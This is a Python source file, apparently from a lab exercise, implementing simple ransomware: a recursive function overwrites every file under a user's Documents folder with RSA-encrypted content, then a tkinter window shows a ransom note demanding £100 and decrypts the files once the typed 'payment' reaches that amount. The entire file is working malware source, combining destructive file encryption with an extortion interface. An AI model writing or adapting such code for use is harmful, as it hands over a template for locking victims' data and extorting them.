import RSA, os
from tkinter import *
from PIL import ImageTk, Image

# Ransomware body:

def recursive_encryption(path):
    '''Search through all directories under a given starting point and
       encrypt all files.
    '''
    directoryList = []
    if os.path.isdir(path):  # Check if directory exists.
        if os.listdir(path):  # Check if directory is empty.
            for f in os.listdir(path):  # For all items in the directory
                if os.path.isfile(path + f):   # if item is a file, open, encrypt, then save.
                    abso = path + f
                    with open(abso) as fi:
                        contents = fi.read()
                    with open(abso, 'w') as fi:
                        contents = contents.rstrip()
                        toWrite = RSA.main('encrypt', contents)
                        fi.write(toWrite)
                else:                                 
                    directoryList.append(path + f)    # If item is a directory, add it to a list.
            if len(directoryList) > 0:  # The base case for recursion.
                for i in directoryList: # for each item in the direcctory list, enter the directory and call the encryption function again.
                    os.chdir(i)
                    recursive_encryption(f"{i}/")
        else:
            return None
    else:
        return None

def recursive_decryption(path):
    directoryList = []
    if os.path.isdir(path): # Check if directory exists.
        if os.listdir(path): # Check if directory is empty.
            for f in os.listdir(path): # For all items in the directory
                if os.path.isfile(path + f):   # If item is a file, open, decrpyt, then save
                    abso = path + f
                    with open(abso) as fi:
                        contents = fi.read()
                    with open(abso, 'w') as fi:
                        contents = contents.rstrip()
                        toWrite = RSA.main('decrypt', contents)
                        fi.write(toWrite)
                else:
                    directoryList.append(path + f)   # If item is a directory, add it to a list.
            if len(directoryList) > 0:
                for i in directoryList:
                    os.chdir(i)
                    recursive_decryption(f"{i}/")
        else:
            return None
    else:
        return None


recursive_encryption('C:/Users/Owner/Documents/Alex/')

# tkinter ransom note pop up
root = Tk()
font_tuple = ("Chiller", 18, "bold") # configure the font to be used throughout
root.title("You have been very foolish!")


root.configure(background='black')


# Load and resize the ransom note image.
img = ImageTk.PhotoImage(Image.open("C:/Users/Owner/Documents/GitHub/Lab_Ransomware/final.jpg").resize((400, 300)))
background = Label(image=img, border=0)
background.grid(row=0, column=0)

# Create the ransom note and configure the font and colours.
myLabel2 = Label(root, text="Oh dear, you've been hacked! We have encrypted all of your files.", fg='red', bg='black')
myLabel3 = Label(root, text="If you want to get your files back you must pay us £100.", fg='red', bg='black')
myLabel4 = Label(root, text="We will decrypt your files when we receive the specified amount.", fg='red', bg='black')
myLabel5 = Label(root, text="If you choose not to pay us, your files will remain locked.", fg='red', bg='black')
myLabel6 = Label(root, text="Enter the amount in to the box and click send.", fg='red', bg='black')
myLabel2.configure(font=font_tuple)
myLabel3.configure(font=font_tuple)
myLabel4.configure(font=font_tuple)
myLabel5.configure(font=font_tuple)
myLabel6.configure(font=font_tuple)

# Position each sentence in the widget's grid
myLabel2.grid(row=1, column=0)
myLabel3.grid(row=2, column=0)
myLabel4.grid(row=3, column=0)
myLabel5.grid(row=4, column=0)
myLabel6.grid(row=5, column=0)

# Initialize the variable that will store the payment.
amount = 0

def send():
    '''
    Read the input from the text box and compare it to a minimum value.
    If the input is below the minimum value, demand more money.
    If the input is greater than or equal to, thank the victim and exit
    the main loop to begin the decryption process.
    '''
    global amount # declare a global variable so that 'amount' can be incremented each time the function runs.
    pay = textBox.get()
    try:
        amount += int(pay)
        textBox.delete(0, END) # clear the textbox each time an amount is entered.
        if amount < 100: # If the victim has paid less than £100, tell them they need to pay more.
            myLabel = Label(root, text=f"You have paid only £{amount}, you need to pay £{100-amount} more.", fg='red', bg='black') # Generate the text response to not
            myLabel.configure(font=font_tuple)                                                                                     # paying enough.    
            myLabel.grid(row=8, column=0)
        else: # If the victim has paid enough, thank them and begin the decryption process
            myLabel = Label(root, text="Thank you. Your files have been decrypted.", fg='red', bg='black') # Generate the text response to paying the full amount.
            myLabel.configure(font=font_tuple) 
            myLabel.grid(row=9, column=0)
            root.quit() # quit the main loop once the correct amount has been paid.
    except ValueError:
        pass

while amount < 100: # allow the entry of more money whilst the amount is below £100
    textBox = Entry(root, borderwidth=8, relief='sunken', bg='Snow3')
    textBox.grid(row=6, column=0)
    myButton = Button(root, text="Send", command=send, fg='red', bg='Snow3')
    myButton.configure(font=font_tuple)
    myButton.grid(row=7, column=0)
    root.mainloop()

recursive_decryption('C:/Users/Owner/Documents/Alex/') # Decrypt the files once the ransom has been paid.

